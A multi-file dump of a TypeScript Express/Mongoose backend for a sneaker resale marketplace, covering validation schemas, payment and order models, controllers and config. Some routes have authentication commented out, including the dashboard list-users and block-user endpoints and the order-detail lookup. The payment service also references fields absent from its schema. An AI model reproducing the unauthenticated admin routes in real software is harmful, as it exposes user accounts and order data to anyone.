        variant: z.array(VariantSchema).min(1, "At least 1 value is required"),
        askingPrice: z.number().min(0, "Asking price must be a positive number"),
        condition: z.enum(["New", "Never worn", "Worn once", "Worn few times", "Used - Good condition", "Used - Fair condition"]).optional(),
        isVisibleToStore: z.boolean().optional(),
        isShowAskingPrice: z.boolean().optional(),
        isAllowDirectRequest: z.boolean().optional(),
    }),
});

const makeRequestForPairValidationSchema = z.object({
    body: z.object({
        pairId: z.string().min(24, "Pair ID is required"),
        quantity: z.number().min(1, "Quantity is required").optional(),
        variant: z.object({
            gender: z.string().min(1, "Gender is required"),
            size: z.number().min(0, "Size must be a positive number")
        }).optional(),
        askingPrice: z.number().min(1, "Asking price must be a positive number").optional(),
        offerPrice: z.number().min(1, "Offer price must be a positive number"),
        validityHours: z.number().min(1, "Validity hours is required"),
        note: z.string().optional(),
        dealCompletionType: z.enum(["Meetup", "Store dropoff","Shipping","Direct"]).optional(),
    }),
});



const PairsValidations = { 
    addnewPairValidationSchema,
    makeRequestForPairValidationSchema
 };

export default PairsValidations;
```

## File: src/app/module/Payment/Payment.interface.ts
```typescript
import { Types } from "mongoose";

export interface ISubscriptionPlan {
    title: string;
    price: number;
    features: string[];
    duration: string;
    createdAt: Date;
}

export interface IPayment {
    user: Types.ObjectId;
    couple: Types.ObjectId;
    subscription?:{
        id: Types.ObjectId
        planName: string;
        planPrice: number;
        startDate: Date,
        expireDate: Date,
    };
    paymentId?: string;
    createdAt: Date
}

// export interface IPayment {
//     orderId: Types.ObjectId;

//     buyerId: Types.ObjectId;

//     amount: number;

//     gateway:
//         | "STRIPE"
//         | "SSL_COMMERZ"
//         | "BKASH";

//     transactionId: string;

//     status:
//         | "PENDING"
//         | "SUCCESS"
//         | "FAILED";

//     gatewayResponse?: any;
// }
```

## File: src/app/module/Payment/Payment.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import { IPayment, ISubscriptionPlan } from "./Payment.interface";

const SubscriptionSchema = new Schema<ISubscriptionPlan>({
    title: { type: String, required: true },
    price: { type: Number, required: true },
    features: [{ type: String, required: true }],
    createdAt: { type: Date, default: Date.now }
});

const PaymentSchema = new Schema<IPayment>({
    user: { type: Schema.Types.ObjectId, required: true, ref: "User" },
    couple: { type: Schema.Types.ObjectId, ref: "Couple", default: null },
    subscription: {
        id: {type: Schema.Types.ObjectId, ref: "SubscriptionPlan", required: true},
        planName: {type: String, required: true},
        planPrice: {type: Number, required: true},
        startDate: {type: Date, required: true},
        expireDate: {type: Date, required: true},
    },
    paymentId: { type: String, required: true },
    createdAt: { type: Date, default: Date.now }
});

// const PaymentSchema = new Schema<IPayment>({
//     orderId: {
//         type: Schema.Types.ObjectId,
//         ref: "Order",
//         required: true,
//     },

//     buyerId: {
//         type: Schema.Types.ObjectId,
//         ref: "Buyer",
//         required: true,
//     },

//     amount: Number,

//     gateway: {
//         type: String,
//         enum: ["STRIPE", "SSL_COMMERZ", "BKASH"],
//     },

//     transactionId: {
//         type: String,
//         unique: true,
//     },

//     status: {
//         type: String,
//         enum: ["PENDING", "SUCCESS", "FAILED"],
//         default: "PENDING",
//     },

//     gatewayResponse: Schema.Types.Mixed,

// }, { timestamps: true });

export const SubscriptionPlanModel = models.SubscriptionPlan || model<ISubscriptionPlan>("SubscriptionPlan", SubscriptionSchema);

export const PaymentModel = models.Payment || model<IPayment>("Payment", PaymentSchema);
```

## File: src/app/module/Payment/PaymentSuccess.service.ts
```typescript
// payment-success.service.ts

import mongoose from "mongoose";
import { OrderItemModel, OrderModel } from "../Order/Order.model";
import { PaymentModel } from "./Payment.model";
import {ProductModel} from "../Product/Product.model";
import CartModel from "../Cart/Cart.model";



interface CompleteOrderPayload {
    orderId: string;
    transactionId: string;
    session?: mongoose.ClientSession;
}

export const completeOrderAfterPayment = async (
    payload: CompleteOrderPayload
) => {

    const ownSession = !payload.session;

    const session =
        payload.session ||
        await mongoose.startSession();

    try {

        if (ownSession) {
            session.startTransaction();
        }

        // =====================================================
        // 1. GET ORDER
        // =====================================================

        const order = await OrderModel.findById(
            payload.orderId
        ).session(session);

        if (!order) {
            throw new Error("Order not found");
        }

        // =====================================================
        // 2. UPDATE PAYMENT
        // =====================================================

        await PaymentModel.updateOne(
            {
                transactionId: payload.transactionId,
            },
            {
                status: "SUCCESS",
            },
            { session }
        );

        // =====================================================
        // 3. UPDATE ORDER STATUS
        // =====================================================

        order.paymentStatus = "PAID";

        order.orderStatus = "PROCESSING";

        await order.save({ session });

        // =====================================================
        // 4. GET ORDER ITEMS
        // =====================================================

        const orderItems = await OrderItemModel.find({
            orderId: order._id,
        }).session(session);

        // =====================================================
        // 5. REDUCE INVENTORY
        // =====================================================

        for (const item of orderItems) {

            await ProductModel.updateOne(
                {
                    _id: item.productId,
                    "sizes.size": item.selectedSize,
                },
                {
                    $inc: {
                        "sizes.$.stock": -item.quantity,
                    },
                },
                { session }
            );
        }

        // =====================================================
        // 6. MARK CARTS ORDERED
        // =====================================================

        await CartModel.updateMany(
            {
                buyerId: order.buyerId,
                status: "ACTIVE",
            },
            {
                status: "ORDERED",
            },
            { session }
        );

        // =====================================================
        // 7. OPTIONAL NOTIFICATIONS
        // =====================================================

        // notify buyer
        // notify retailer
        // send email
        // send invoice

        if (ownSession) {
            await session.commitTransaction();
        }

        return {
            success: true,
            message: "Order completed successfully",
        };

    } catch (error: any) {

        if (ownSession) {
            await session.abortTransaction();
        }

        throw new Error(error.message);

    } finally {

        if (ownSession) {
            session.endSession();
        }
    }
};
```

## File: src/app/module/Promotion/Promotion.controller.ts
```typescript
import { AuthRequest } from "../../../interface/authRequest";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import PromotionServices from "./Promotion.service";

const createNewPromotionController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await PromotionServices.createNewPromotionService(user, req.body);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "Promotion created successfully",
        data: result,
    });
});

const getAllPreviousPromotion = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await PromotionServices.getAllRetailerPromotion(user, req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved all promotion.",
        data: result,
    });
});

const PromotionController = { 
    createNewPromotionController,
    getAllPreviousPromotion
 };



export default PromotionController;
```

## File: src/app/module/Promotion/Promotion.validation.ts
```typescript
import { resolveClientEndpointParameters } from "@aws-sdk/client-s3/dist-types/endpoint/EndpointParameters";
import { z } from "zod";
import { ENUM_PROMOTION_RECEIVER_TYPE, ENUM_PROMOTION_SEND_METHOD, ENUM_PROMOTION_TYPE } from "../../../utilities/enum";

        
const createNewPromotionValidation = z.object({
    body: z.object({
        title: z.string().min(1,"Title is required"),
        content: z.string().min(1,"Content is required"),
        type: z.nativeEnum(ENUM_PROMOTION_TYPE),
        recepient: z.nativeEnum(ENUM_PROMOTION_RECEIVER_TYPE),
        sendMethod: z.nativeEnum(ENUM_PROMOTION_SEND_METHOD),
        duration: z.number().min(1,"Minimum 1 hour required.")
        // type: z.enum(Object.values(ENUM_PROMOTION_TYPE) as [string, ...string[]]),
        // recepient: z.enum(Object.values(ENUM_PROMOTION_RECEIVER_TYPE) as [string, ...string[]]),
        // sendMethod: z.enum(Object.values(ENUM_PROMOTION_SEND_METHOD) as [string, ...string[]]),
    }),
});

const PromotionValidations = { 
    createNewPromotionValidation
 };

export default PromotionValidations;
```

## File: src/app/module/Reseller/Reseller.interface.ts
```typescript
import { Types } from "mongoose";

export interface IReseller {
  id: Types.ObjectId;
  auth: Types.ObjectId;
  badge: string;
  name: string;
  email: string;
  image: string;
  // shoeSize: number;
  bio: string;
  type: string;
  location: {
    type: string;
    coordinates: number[];
  };
  address: string;
  phone: string;
  website: string;
  operationHour: {};
  socialLink: {};
  subscription: Types.ObjectId;
  subscriptionStartDate: Date;
  subscriptionEndDate: Date;
  isApproved: boolean;
  createdAT: Date;
}
```

## File: src/app/module/Reseller/Reseller.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import { IReseller } from "./Reseller.interface";

const ResellerSchema = new Schema<IReseller>({
    auth: { type: Schema.Types.ObjectId, required: true, ref: "Auth" },
    badge: { type: String, default: "" },
    name: { type: String, required: true },
    email: { type: String, required: true, unique: true },
    image: { type: String, default: "" },
    bio: { type: String, default: "" },
    // shoeSize: { type: Number, default: 0 },
    type: { type: String, default: "" },
    location: {
        type: {
            type: String,
            enum: ["Point"],
            default: "Point",
        },
        coordinates: {
            type: [Number],
            default: [0, 0],
        },
    },
    address: { type: String, default:"" },
    phone: { type: String, default:"" },
    website: { type: String, default:"" },
    operationHour: { type: Object, default:{} },
    socialLink:{type:Object,default:{}},
    subscription:{type:Schema.Types.ObjectId,ref:"Subscription"},
    subscriptionStartDate:{type:Date},
    subscriptionEndDate:{type:Date},
    isApproved:{type:Boolean,default:false},
}, { timestamps: true });

const ResellerModel = models.Reseller || model<IReseller>("Reseller", ResellerSchema);

export default ResellerModel;
```

## File: src/app/module/Settings/Settings.interface.ts
```typescript
import { Types } from "mongoose";

export interface ISettings {
    // id: string;
    description: string;
}

export interface IFaq{
    question: string;
    answer: string;
}

export interface IHelpAndSupport {
    buyerId: Types.ObjectId;
    orderId: Types.ObjectId;
    type: string;
    images: string[];
    content: string;
    status: string;
    isUrgent: boolean;
    createdAt: Date;
}

export interface IReport {
    buyerId: Types.ObjectId;
    productId: Types.ObjectId;
    type: string;
    images: string[];
    content: string;
    contactMethod: string;
    isUrgent: boolean;
    createdAt: Date;
}
```

## File: src/app/module/User/User.routes.ts
```typescript
import express from "express";
import {auth,authorizeUser} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import UserValidations from "./User.validation";
import UserController from "./User.controller";
import { uploadProfile } from "../../middlewares/multerMiddleware";


const userRouter = express.Router();


userRouter.patch("/update-profile",
    // auth(["Supplier","Customer"]),
    authorizeUser,
    uploadProfile.single('profile-image'),
    validateRequest(UserValidations.updateprofileValidation),
    UserController.updateProfile
);

userRouter.get("/get-profile-detail",
    // auth(["Supplier","Customer"]),
    authorizeUser,
    UserController.getMyProfile
);


userRouter.patch("/change-password",
    authorizeUser,
    validateRequest(UserValidations.changePasswordValidation),
    UserController.changePassword
);

//dashboard

userRouter.get("/get-al-user",
    // auth(["Supplier","Customer"]),
    // validateRequest(UserValidations.addBankDetailValidation),
    UserController.dashboardGetUser
);

userRouter.get("/block-user/:id",
    // auth(["Supplier","Customer"]),
    // validateRequest(UserValidations.addBankDetailValidation),
    UserController.blockUser
);


export default userRouter;
```

## File: src/config/index.ts
```typescript
import dotenv from 'dotenv';
import path from 'path';

dotenv.config({ path: path.join(process.cwd(), '.env') });

export default {
  NODE_ENV: process.env.NODE_ENV,
  port: process.env.PORT,
  base_url: process.env.BASE_URL,
  database_url: process.env.DATABASE_URL,

  jwt: {
    secret: process.env.JWT_SECRET,
    refresh_secret: process.env.JWT_REFRESH_SECRET,
    expires_in: process.env.JWT_EXPIRES_IN,
    refresh_expires_in: process.env.JWT_REFRESH_EXPIRES_IN,
  },
  bcrypt: {
    salt_round: process.env.BCRYPT_SALT_ROUNDS
  },
  smtp: {
    smtp_host: process.env.SMTP_HOST,
    smtp_port: process.env.SMTP_PORT,
    smtp_service: process.env.SMTP_SERVICE,
    smtp_mail: process.env.SMTP_MAIL,
    smtp_password: process.env.SMTP_PASSWORD,
    name: process.env.SERVICE_NAME,
  },
  aws:{
    access_key: process.env.AWS_ACCESS_KEY,
    secret_access_key: process.env.AWS_SECRET_ACCESS_KEY,
    region: process.env.AWS_REGION,
    bucket_name: process.env.S3_BUCKET_NAME
  },
//   cloudinary: {
//     cloud_name: process.env.CLOUD_NAME,
//     api_key: process.env.API_KEY,
//     api_secret: process.env.API_SECRET,
//     cloudinary_url: process.env.CLOUDINARY_URL,
//   },
//   stripe: {
//     stripe_secret_key: process.env.STRIPE_SECRET_KEY,
//     stripe_webhook_secret_test: process.env.STRIPE_WEBHOOK_SECRET_TEST,
//     stripe_webhook_secret_production:
//       process.env.STRIPE_WEBHOOK_SECRET_PRODUCTION,
//   },
  openai: {
    openai_api_key: process.env.OPENAI_API_KEY,
  },
//   variables: {
//     email_temp_image: process.env.EMAIL_TEMP_IMAGE,
//     email_temp_text_secondary_color:
//       process.env.EMAIL_TEMP_TEXT_SECONDARY_COLOR,
//   },
  
};
```

## File: src/app/module/auth/auth.model.ts
```typescript
import { model, models, Schema } from "mongoose";
import bcrypt from "bcrypt";
import config from "../../../config";
import { IAuth } from "./auth.interface";
import { ENUM_AUTH_PROVIDER_TYPE, ENUM_USER_Type } from "../../../utilities/enum";


const AuthSchema = new Schema<IAuth>({
    profile: { type: Schema.Types.ObjectId,  refPath: "refModel"  },
    refModel: { type: String, required: true },
    // name: { type: String, required: true },
    email: { type: String, required: true, unique: true },
    password: { type: String, required: true },
    phone: { type: String, default: "" },
    authProviders: [{
        provider: {
            type: String,
            enum: Object.values(ENUM_AUTH_PROVIDER_TYPE),
            required: true
        },

        providerId: {
            type: String,
            required: true
        }
    }],
    role: { type: String, required: true , enum: Object.values(ENUM_USER_Type)},
    verificationCode: { type: String, default: "" },
    isEmailVerified: { type: Boolean, default: false },
    isProfileCompleted: { type: Boolean, default: false },
    isBlocked: { type: Boolean, default: false },
}, { timestamps: true });

// UserSchema.pre('save', async function (next) {
//     // eslint-disable-next-line @typescript-eslint/no-this-alias
//     const user = this;
//     if (user.password) {
//         user.password = await bcrypt.hash(
//             user.password,
//             Number(config.bcrypt.salt_round)
//         );
//     }
//     next();
// });

// UserSchema.post('save', function (doc, next) {
//     doc.password = '';
//     next();
// });

// // statics method for check is user exists
// UserSchema.statics.isUserExists = async function (phoneNumber: string) {
//     return await UserModel.findOne({ phoneNumber }).select('+password');
// };

// // statics method for check password match  ----
// UserSchema.statics.isPasswordMatched = async function (
//     plainPasswords: string,
//     hashPassword: string
// ) {
//     return await bcrypt.compare(plainPasswords, hashPassword);
// };

// UserSchema.statics.isJWTIssuedBeforePasswordChange = async function (
//     passwordChangeTimeStamp,
//     jwtIssuedTimeStamp
// ) {
//     const passwordChangeTime =
//         new Date(passwordChangeTimeStamp).getTime() / 1000;

//     return passwordChangeTime > jwtIssuedTimeStamp;
// };

const AuthModel = models.Auth || model<IAuth>("Auth", AuthSchema);

export default AuthModel;
```

## File: src/app/module/auth/auth.validation.ts
```typescript
import { z } from "zod";

const registerUserValidationSchema = z.object({
  body: z.object({

    name: z
      .string()
      .min(1, "Full name is required"),

    email: z
      .string()
      .email("Invalid email format"),

    userType: z
      .string()
      .min(1, "User type is required"),

    password: z
      .string()
      .min(6, "Password must be at least 6 characters"),

    confirmPassword: z
      .string()
      .min(6, "Password must be at least 6 characters"),

    shoeSize: z
      .number()
      .min(1, "Shoe size must be at least 1")
      .optional(),

    latitude: z
      .number()
      .refine((value) => value >= -90 && value <= 90, {
        message: "Latitude must be between -90 and 90",
      })
      .optional(),

    longitude: z
      .number()
      .refine((value) => value >= -180 && value <= 180, {
        message: "Longitude must be between -180 and 180",
      })
      .optional(),
  })
  // validate that password === confirmPassword
  .refine(
    (data) => data.password === data.confirmPassword,
    {
      message: "Password and confirm password must match",
      path: ["confirmPassword"],
    }
  ),
});



const loginValidationSchema = z.object({
    body: z.object({
        email: z.string().email('Email must be a valid email'),
        password: z.string().min(6, 'Password must be at least 6 characters'),
    }),
});

const verifyCodeValidation = z.object({
    body: z.object({
        email: z.string().email('Email must be a valid email'),
        verifyCode: z.string().min(4, 'Verification code must be at least 4 characters'),
    }),
});

const sendVerifyCodeValidation = z.object({
    body: z.object({
        email: z.string().trim().toLowerCase().email('Email must be a valid email')
    }),
});

const resetPasswordValidation = z.object({
    body: z.object({
        // email: z.string().trim().toLowerCase().email('Email must be a valid email'),
        newPassword: z.string().min(4, 'New password must be at least 4 characters'),
        confirmPassword: z.string().min(4, 'Confirm password must be at least 4 characters'),
        
      })
      // validate that password === confirmPassword
      .refine(
        (data) => data.newPassword === data.confirmPassword,
        {
          message: "Password and confirm password must match",
          path: ["confirmPassword"],
        }
      ),
});

const changePasswordValidationSchema = z.object({
    body: z.object({
        oldPassword: z.string().min(1, 'Old password must be at least 6 characters'),
        newPassword: z.string().min(6, 'New password must be at least 6 characters'),
    }),
});

const completeProfileValidationSchema = z.object({
  body: z.object({
    user: z.string().min(1, "User ID is required"),
    name: z.string().min(1, "Name is required"),
    email: z.string().email("Invalid email format"),
  })
});

const AuthValidations = { 
    registerUserValidationSchema,
    loginValidationSchema,
    verifyCodeValidation,
    sendVerifyCodeValidation,
    resetPasswordValidation,
    changePasswordValidationSchema,
    completeProfileValidationSchema
 };
export default AuthValidations;
```

## File: src/app/module/Buyer/Buyer.controller.ts
```typescript
import { AuthRequest } from "../../../interface/authRequest";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import BuyerServices from "./Buyer.service";

const setBuyerNotificationAlertsController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await BuyerServices.setBuyerNotificationAlerts(user, req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Notification alerts set successfully",
        data: result,
    });
});

const addSelectedShoeSizeController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await BuyerServices.addSelectedShoeSize(user, req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Selected shoe sizes added successfully",
        data: result,
    });
});

const addBrandsOfInterestController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await BuyerServices.addBrandsOfInterest(user, req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Brands of interest added successfully",
        data: result,
    });
});

const getBuyersInterestsDataController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await BuyerServices.getBuyersInterestsData(user);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Buyer interests data retrieved successfully",
        data: result,
    });
});

const updateBuyerProfileController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await BuyerServices.updateBuyerProfileService(user,req.file, req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Buyer profile updated successfully",
        data: result,
    });
});


//buyer home page

const getNearbyProductsForBuyerController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await BuyerServices.getNearbyProductsForBuyer(user,req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved buyer nearby product.",
        data: result,
    });
});

const getBuyerFollowedBrandsProductsController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await BuyerServices.getBuyerFollowedBrandsProducts(user);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved buyer followed brand product.",
        data: result,
    });
});

const getBuyerFollowedRetailersProductsController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await BuyerServices.getBuyerFollowedRetailersProducts(user);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved buyer followed retailer product.",
        data: result,
    });
});

const getBuyerFollowedBrandStoreWishlistData = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await BuyerServices.getBuyersStoreBrandWishlistdataService(user);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved buyer followed retailer, brands, wishlist data.",
        data: result,
    });
});

const BuyerController = { 
    setBuyerNotificationAlertsController,
    addSelectedShoeSizeController,
    addBrandsOfInterestController,
    getBuyersInterestsDataController,
    updateBuyerProfileController,

    getNearbyProductsForBuyerController,
    getBuyerFollowedBrandsProductsController,
    getBuyerFollowedRetailersProductsController,
    getBuyerFollowedBrandStoreWishlistData
}


export default BuyerController;
```

## File: src/app/module/Cart/Cart.controller.ts
```typescript
import { AuthRequest } from "../../../interface/authRequest";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import CartServices from "./Cart.service";

const addToCartController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await CartServices.addToCartService(user, req.body);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "Product added to cart successfully.",
        data: result,
    });
});

const deleteFromCartItemController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await CartServices.deleteCartItemService(user, req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Cart item updated successfully.",
        data: result,
    });
});

const increaseCartItemQuantityController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await CartServices.increaseCartItemQuantityService(user,req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Cart item quantity increased successfully.",
        data: result,
    });
});

const applyPromoCodeController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await CartServices.applypromoCodeService(user, req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Promo code applied successfully.",
        data: result,
    });
});

const placeOrderController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await CartServices.placeOrderFromCartService(user, req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Order placed successfully.",
        data: result,
    });
});

const CartController = { 
    addToCartController,
    deleteFromCartItemController,
    increaseCartItemQuantityController,
    applyPromoCodeController,
    placeOrderController
 };

export default CartController;
```

## File: src/app/module/Engagement/Engagement.interface.ts
```typescript
import { Types } from "mongoose";

export interface IFollow {
  buyerId: Types.ObjectId;      // ref Buyer.id
  retailerId: Types.ObjectId;   // ref Retailer.id
  createdAt: Date;
}

export interface IUserFollow {
  senderId: Types.ObjectId;      // ref Buyer.id
  receiverId: Types.ObjectId;   // ref Retailer.id
  createdAt: Date;
}

export interface IwishList {
  buyerId: Types.ObjectId;      // ref Buyer.id
  retailerId: Types.ObjectId;   // ref Retailer.id
  productId: Types.ObjectId;
  isWanted: boolean;   // ref Product.id
  createdAt: Date;
}

export interface IReview {
  buyerId: Types.ObjectId;      // ref Buyer.id
  retailerId: Types.ObjectId;
  productId: Types.ObjectId; 
  content: string;
  overallrating: number;
  customerServiceRating: number;
  authenticityRating: number;
  pickupSpeedRating: number;
  priceRating: number;
  storeExperienceRating: number;
  staffHelpfulnessRating: number; // ref Product.id
  createdAt: Date;
}
```

## File: src/app/module/Engagement/Engagement.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import {  IFollow, IReview, IUserFollow, IwishList } from "./Engagement.interface";

//follow model schema
const FollowSchema = new Schema<IFollow>({
    
  buyerId: {
    type: Schema.Types.ObjectId,
    ref: "Buyer",
    required: true,
  },
  retailerId: {
    type: Schema.Types.ObjectId,
    ref: "Retailer",
    required: true,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  }
});

FollowSchema.index({ buyerId: 1, retailerId: 1 },{ unique: true });

//user follow model
const UserFollowSchema = new Schema<IUserFollow>({
    
  senderId: {
    type: Schema.Types.ObjectId,
    ref: "Buyer",
    required: true,
  },
  receiverId: {
    type: Schema.Types.ObjectId,
    ref: "Buyer",
    required: true,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  }
});

UserFollowSchema.index({ senderId: 1, receiverId: 1},{unique: true});


//review model schema
const ReviewSchema = new Schema<IReview>({
    
  buyerId: {
    type: Schema.Types.ObjectId,
    ref: "Buyer",
    required: true,
  },
  retailerId: {
    type: Schema.Types.ObjectId,
    ref: "Retailer",
    required: true,
  },
  productId: {
    type: Schema.Types.ObjectId,
    ref: "Product",
    required: true,
  },
  content: {
    type: String,
    required: true,
  },
  overallrating: {
    type: Number,
    min: 1,
    max: 5,
    required: true,
  },
  customerServiceRating: {
    type: Number,
    min: 1,
    max: 5,
    required: true,
  },
  authenticityRating: {
    type: Number,
    min: 1,
    max: 5,
    required: true,
  },
  pickupSpeedRating: {
    type: Number,
    min: 1,
    max: 5,
    required: true,
  },
  priceRating: {
    type: Number,
    min: 1,
    max: 5,
    required: true,
  },
  storeExperienceRating: {
    type: Number,
    min: 1,
    max: 5,
    required: true,
  },
  staffHelpfulnessRating: {
    type: Number,
    min: 1,
    max: 5,
    required: true,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  }
});

//wishlist model schema
const WishListSchema = new Schema<IwishList>({
    
  buyerId: {
    type: Schema.Types.ObjectId,
    ref: "Buyer",
    required: true,
  },
  retailerId: {
    type: Schema.Types.ObjectId,
    ref: "Retailer",
    required: true,
  },
  productId: {
    type: Schema.Types.ObjectId,
    ref: "Product",
    required: true,
  },
  isWanted: {
    type: Boolean,
    default: false,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  }
});


const FollowModel = models.Follow || model<IFollow>("Follow", FollowSchema);

const FollowUserModel = models.FollowUser || model<IUserFollow>("FollowUser", UserFollowSchema);

const ReviewModel = models.Review || model<IReview>("Review", ReviewSchema);

const WishListModel = models.WishList || model<IwishList>("WishList", WishListSchema);

export { 
    FollowModel,
    FollowUserModel,
    ReviewModel,
    WishListModel
};
```

## File: src/app/module/Order/Order.controller.ts
```typescript
import { AuthRequest } from "../../../interface/authRequest";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import OrderServices from "./Order.service";



const getRetailerHomePageOrderStatDataController = catchAsync(async (req, res) => {

    const {user} = req as AuthRequest;

    const result = await OrderServices.getRetailerHomePageOrderStatDataService(user);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved retailer home page order stat data.",
        data: result,
    });
});

const getOrderDetailController = catchAsync(async (req, res) => {

    // const {user} = req as AuthRequest;

    const result = await OrderServices.getOrderDetailsById(req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved order detail.",
        data: result,
    });
});

const retailerAcceptOrder = catchAsync(async (req, res) => {

    const {user} = req as AuthRequest;

    const result = await OrderServices.retailerAcceptOrderService(user,req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Order Accepted.",
        data: result,
    });
});

const OrderController = { 
    getRetailerHomePageOrderStatDataController,
    getOrderDetailController,
    retailerAcceptOrder,
};

export default OrderController;
```

## File: src/app/module/Order/Order.interface.ts
```typescript
import { Types } from "mongoose";

export interface IOrder {
    buyerId: Types.ObjectId;
    // retailerId: Types.ObjectId;
    orderNumber: string;
    subtotal: number;
    shippingCharge: number;
    discountAmount: number;
    totalAmount: number;
    totalItems: number;
    // productId: Types.ObjectId;
    orderStatus: string;
    paymentStatus: string;
    paymentMethod: string;
    orderType: string;
    // selectedSize: number;
    // quantity: number;
    // unitPrice: number;
    // totalPrice: number;
     shippingAddress: {
        name: string;
        phone: string;
        address: string;
        lat: number;
        lng: number;
        city: string;
        area?: string;
    };

    holdingTime?: number;
    holdingStartTime?: Date;
    holdingEndTime?: Date;
    partialPayment?: number;

    pickupTime: Date;
    createdAt: Date;
}

export interface IOrderItem {
    orderId: Types.ObjectId;

    buyerId: Types.ObjectId;

    retailerId: Types.ObjectId;

    productId: Types.ObjectId;

    productSnapshot: {
        name: string;
        image: string;
        brand: string;
    };

    selectedSize: number;

    quantity: number;

    unitPrice: number;

    totalPrice: number;

    pickupTime?: Date;

    status: string;

    createdAt: Date;
}

export interface ISellerSplitOrder {
    orderId: Types.ObjectId;

    retailerId: Types.ObjectId;

    buyerId: Types.ObjectId;

    totalItems: number;

    totalAmount: number;

    status: string;

    createdAt: Date;
}

export type TOrderPayload = {
    retailerId: Types.ObjectId;
    productId: Types.ObjectId;
    orderType: string;
    selectedSize: number;
    quantity: number;
    unitPrice: number;
    pickupTime: Date;
}
```

## File: src/app/module/Order/Order.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import { IOrder, IOrderItem, ISellerSplitOrder } from "./Order.interface";
import { ENUM_ORDER_ITEM_STATUS, ENUM_ORDER_STATUS, ENUM_ORDER_TYPE, ENUM_PAYMENT_METHOD, ENUM_PAYMENT_STATUS, ENUM_SELLER_SPLIT_ORDER_STATUS } from "../../../utilities/enum";

//order model schema
const OrderSchema = new Schema<IOrder>({

    buyerId: { type: Schema.Types.ObjectId, ref: "Buyer", required: true },
    orderNumber: { type: String, required: true, unique: true },

    subtotal: { type: Number, required: true },
    shippingCharge: { type: Number, required: true },
    discountAmount: { type: Number, required: true },
    totalAmount: { type: Number, required: true },
    totalItems: { type: Number, required: true },

    orderStatus: { type: String, enum: Object.values(ENUM_ORDER_STATUS), default: ENUM_ORDER_STATUS.PLACED },
    orderType: { type: String, enum: Object.values(ENUM_ORDER_TYPE), default: ENUM_ORDER_TYPE.BUY_NOW },
    paymentStatus: { type: String, enum: Object.values(ENUM_PAYMENT_STATUS), default: ENUM_PAYMENT_STATUS.PENDING },
    paymentMethod: { type: String, enum: Object.values(ENUM_PAYMENT_METHOD), default: ENUM_PAYMENT_METHOD.STRIPE },

    shippingAddress: {
        name: { type: String, required: true },
        phone: { type: String, required: true },
        address: { type: String, required: true },
        city: { type: String, required: true },
        area: { type: String },
        lat: { type: Number, required: true },
        lng: { type: Number, required: true }
    },

    holdingTime: { type: Number, default: 0 },
    holdingStartTime: { type: Date , default: null },
    holdingEndTime: { type: Date, default: null },

    pickupTime: { type: Date, required: true },
}, { timestamps: true });

//order item model schema
const OrderItemSchema = new Schema<IOrderItem>({
    buyerId: { type: Schema.Types.ObjectId, ref: "Buyer", required: true },
    retailerId: { type: Schema.Types.ObjectId, ref: "Retailer", required: true },
    productId: { type: Schema.Types.ObjectId, ref: "Product", required: true },
    orderId: { type: Schema.Types.ObjectId, ref: "Order", required: true },
    productSnapshot: {
        name: { type: String, required: true },
        image: { type: String, required: true },
        brand: { type: String, required: true },
    },
    selectedSize: { type: Number, required: true },
    quantity: { type: Number, required: true },
    unitPrice: { type: Number, required: true },
    totalPrice: { type: Number, required: true },
    pickupTime: { type: Date },
